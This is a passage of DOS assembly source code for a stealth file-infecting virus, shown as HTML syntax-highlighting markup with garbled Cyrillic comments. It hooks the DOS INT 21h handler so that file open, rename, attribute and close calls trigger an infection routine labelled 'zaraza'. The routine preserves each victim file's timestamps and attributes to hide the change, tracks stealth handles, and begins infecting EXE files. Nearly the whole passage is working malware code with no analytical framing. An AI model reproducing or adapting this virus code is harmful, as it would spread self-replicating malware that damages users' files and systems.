</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;ˆ­ä¨æ¨p®¢ ­¨¥ ¯p¨ § ¯ãáª¥                                                 ;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">install_int21_hook</span><span class="sc0">                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">Asciiz</span><span class="sc0">                                                    </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">may_infect_this_file</span><span class="sc0">                                      </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">check_anti_mem</span><span class="sc0">                                            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_zaraza</span><span class="sc0">                                               </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc5">GATE2_set_old_int_24_jmpint21</span><span class="sc4">:</span><span class="sc0">                                             </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">                                   </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc5">check_anti_mem</span><span class="sc4">:</span><span class="sc0">                                                            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">6</span><span class="sc0">                            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">anti_mem</span><span class="sc0">                                                  </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">anti_mem</span><span class="sc0">                                                  </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">anti_mem</span><span class="sc0">                                                  </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">                            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">anti_mem</span><span class="sc0">                                                  </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">GATE2_set_old_int_24_jmpint21</span><span class="sc0">                             </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc5">next_step_8</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0"> </span><span class="sc1">;âªpëâ¨¥ ä ©« </span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_9</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;DS:DX - ˆ¬ï ä ©«                                                          ;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">valid_stealth_handles</span><span class="sc0">                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">asciiz</span><span class="sc0">                                                    </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">may_infect_this_file</span><span class="sc0">                                      </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">infect_not_allowed</span><span class="sc0">                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_zaraza</span><span class="sc0">                                               </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc5">infect_not_allowed</span><span class="sc4">:</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">asciiz</span><span class="sc0">                                                    </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">                                   </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc1">;¡p ¡ âë¢ ¥¬ â®«ìª® § p ¦¥­­ë¥ ä ©«ë                              ;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">select_stealth_field</span><span class="sc0">                                      </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc1">;‚ëå®¤: CF=0, ES:BX - ‘¢®¡®¤­®¥ ¯®«¥                               ;³</span><span class="sc0">
        </span><span class="sc1">;       CF=1, ­¥â ¯®«¥© á¢®¡®¤­ëå                                  ;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">                                   </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">fill_stealth_field</span><span class="sc0">                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">                                   </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_old_int24</span><span class="sc0"> </span><span class="sc1">; ‘â ¢¨¬ áâ p®¥ 24'®¥ ¯à¥àë¢ ­¨¥            ;³</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">pointer_to_active_stealth_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">0002</span><span class="sc0">                                                      </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc5">next_step_9</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc0">     </span><span class="sc1">;¥p¥¨¬¥­®¢ âì ¯¥p¥¬¥áâ¨âì ä ©«</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">infected_fnc21</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">     </span><span class="sc1">;¯p®á  âp¨¡ãâ  ä ©« </span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_10</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;¥p¥¨¬¥­®¢ âì/¯¥p¥¬¥áâ¨âì ä ©«                                            ;³</span><span class="sc0">
</span><span class="sc1">;‡ ¯p®á  âp¨¡ãâ  ä ©«                                                      ;³</span><span class="sc0">
</span><span class="sc5">infected_fnc21</span><span class="sc4">:</span><span class="sc0">                                                            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">Asciiz</span><span class="sc0">                                                    </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">may_infect_this_file</span><span class="sc0">                                      </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">                                   </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_zaraza</span><span class="sc0">                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">                                   </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc5">next_step_10</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;‡ p ¦¥­¨¥ ¯®á«¥ ª®¯¨p®¢ ­¨ï                                               ;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">select_stealth_handle</span><span class="sc0">                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">check_after_copy_file</span><span class="sc0">                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">pointer_to_active_stealth_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">                                   </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc5">check_after_copy_file</span><span class="sc4">:</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">infect_after_copy_1</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">                                   </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_function_3E</span><span class="sc0">                                      </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                                                              </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">infect_after_copy_1</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">asciiz</span><span class="sc0">                                                    </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">may_infect_this_file</span><span class="sc0">                                      </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_clc_infect_after_copy</span><span class="sc0">                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_zaraza</span><span class="sc0">                                               </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc5">exit_clc_infect_after_copy</span><span class="sc4">:</span><span class="sc0">                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_old_int24</span><span class="sc0"> </span><span class="sc1">; ‘â ¢¨¬ áâ p®¥ 24'®¥ ¯à¥àë¢ ­¨¥            ;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc5">exit_stc_function_3E</span><span class="sc4">:</span><span class="sc0">                                                      </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_old_int24</span><span class="sc0"> </span><span class="sc1">; ‘â ¢¨¬ áâ p®¥ 24'®¥ ¯à¥àë¢ ­¨¥            ;³</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_old_int24</span><span class="sc0"> </span><span class="sc1">; ‘â ¢¨¬ áâ p®¥ 24'®¥ ¯à¥àë¢ ­¨¥</span><span class="sc0">
        </span><span class="sc1">;‚ áâ¥ª¥ FLAGS</span><span class="sc0">
</span><span class="sc5">exit_int21_processing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">place_of_int21</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ ZARAZA ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">call_zaraza</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc1">;¥p¥¬  âp¨¡ãâë ä ©« </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">error_occurred_zaraza</span><span class="sc0">
        </span><span class="sc1">;‚ëå®¤:  CX -  âp¨¡ãâ</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">attribute_of_file</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">error_occurred_zaraza</span><span class="sc0">
        </span><span class="sc1">;®¥å «¨ § p ¦ âì</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0"> </span><span class="sc1">;âªpëâì ä ©« ¤«ï çâ¥­¨ï/§ ¯¨á¨</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">cannot_take_handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">place_of_handle</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc1">;¥p¥¬ „ âã/‚p¥¬ï á®§¤ ­¨ï ä ©« </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">close_file_exit_zaraza</span><span class="sc0">
        </span><span class="sc1">;‚ëå®¤:  CX - ¢p¥¬ï</span><span class="sc0">
        </span><span class="sc1">;        DX - ¤ â </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">time_of_file</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">date_of_file</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">common_infected</span><span class="sc0">
        </span><span class="sc1">;‘â ¢¨¬ áâ p®¥ ¤ âã/¢p¥¬ï á®§¤ ­¨ï ä ©« </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">place_of_handle</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0B9h</span><span class="sc0"> </span><span class="sc1">;MOV CX,XXXXh</span><span class="sc0">
</span><span class="sc5">time_of_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0BAh</span><span class="sc0"> </span><span class="sc1">;MOV DX,XXXXh</span><span class="sc0">
</span><span class="sc5">date_of_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
</span><span class="sc5">close_file_exit_zaraza</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">
</span><span class="sc5">cannot_take_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;‘â ¢¨¬ áâ pë©  âp¨¡ãâ ä ©«ã</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0B9h</span><span class="sc0"> </span><span class="sc1">;MOV CX,XXXXh</span><span class="sc0">
</span><span class="sc5">attribute_of_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
</span><span class="sc5">error_occurred_zaraza</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">common_infected</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_dses_cs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin</span><span class="sc0">       </span><span class="sc1">;Š ç ¥¬ 20h ¯¥p¢ëå ¡ ©â ¢ OLD ¡ãä¥p</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">old_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_file</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc1">;¥p¥áë« ¥¬ ¢á¥ á®¤¥p¦¨¬®¥ OLD ¢ NEW</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">new_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;DS:[SI] -&gt; ES:[DI]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">go_infec_exe</span><span class="sc0">          </span><span class="sc1">;â®â ä ©« EXE - ˆ¤¥¬ ­  § p ¦¥­¨¥ EXE</span><span class="sc0">
